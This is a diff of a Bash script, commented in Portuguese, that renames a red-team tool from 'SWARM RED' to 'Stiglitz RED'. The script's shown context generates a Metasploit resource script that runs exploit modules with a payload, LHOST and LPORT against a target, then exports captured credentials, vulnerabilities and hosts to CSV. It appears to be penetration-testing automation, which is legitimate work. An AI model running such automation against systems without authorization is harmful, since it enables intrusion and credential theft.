@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
-# SWARM RED — Fase Metasploit
+# Stiglitz RED — Fase Metasploit
 # Roda APENAS módulos para CVEs identificados — sem scanners genéricos.
-# Chamado por: swarm_red.sh run_services()
+# Chamado por: stiglitz_red.sh run_services()
 
 set -uo pipefail
 
@@ -18,9 +18,9 @@ _generate_rc() {
     shift 5; local modules=("$@")
 
     {
-        echo "# SWARM RED — Resource Script gerado automaticamente"
+        echo "# Stiglitz RED — Resource Script gerado automaticamente"
         echo "# Alvo: $target | $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
-        echo "workspace -a swarm_red_$$"
+        echo "workspace -a stiglitz_red_$$"
         echo ""
         for mod in "${modules[@]}"; do
             echo "use $mod"
@@ -88,7 +88,7 @@ run_msf_phase() {
         return 0
     fi
 
-    local rc_file="$msf_dir/swarm_red.rc"
+    local rc_file="$msf_dir/stiglitz_red.rc"
     local log_file="$msf_dir/msf_output.log"
 
     _generate_rc "$rc_file" "$target" "$lhost" "$lport" "$payload" "${all_modules[@]}"
@@ -98,7 +98,7 @@ run_msf_phase() {
 
     # Exportar resultados
     msfconsole -q -x "
-workspace swarm_red_$$
+workspace stiglitz_red_$$
 creds -o $msf_dir/creds.csv
 vulns -o $msf_dir/vulns.csv
 hosts -o $msf_dir/hosts.csv
